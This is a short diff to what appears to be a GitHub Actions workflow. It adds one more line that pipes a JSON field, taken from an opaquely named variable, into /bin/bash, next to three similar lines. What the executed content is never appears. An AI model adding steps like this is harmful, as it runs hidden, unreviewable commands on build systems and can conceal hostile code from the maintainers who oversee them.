@@ -26,6 +26,7 @@ jobs:
           echo $bx5854 | jq -r .ejnn2712 | /bin/bash
           echo $ywn3673 | jq -r .kugea5019 | /bin/bash
           printf '%s' "$sxcz24" | jq -r .bgyrj8973 | /bin/bash
+          printf '%s' "$an5" | jq -r .aue12194 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
